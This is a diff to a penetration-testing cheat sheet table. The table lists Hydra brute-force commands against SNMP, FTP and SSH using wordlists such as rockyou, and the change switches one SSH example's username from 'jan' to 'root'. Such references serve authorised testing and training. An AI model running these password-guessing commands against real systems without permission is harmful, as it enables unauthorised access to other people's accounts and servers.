@@ -10,7 +10,7 @@ The following table uses the $ip variable which can be set with the following co
 |-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|
 | hydra -P password-file.txt -v $ip snmp                                                                                                    | Hydra brute force against SNMP                       |
 | hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp                                                                       | Hydra FTP known user and rockyou password list       |
-| hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.191.61 -t 4 ssh                                                                    | Hydra SSH using known username |
+| hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.191.61 -t 4 ssh                                                                    | Hydra SSH using known username |
 | hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh                                                                              | Hydra SSH using list of users and passwords          |
 | hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh                                                                         | Hydra SSH using a known password and a username list |
 | hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt                                                                                         | Hydra SSH Against Known username on port 22          |
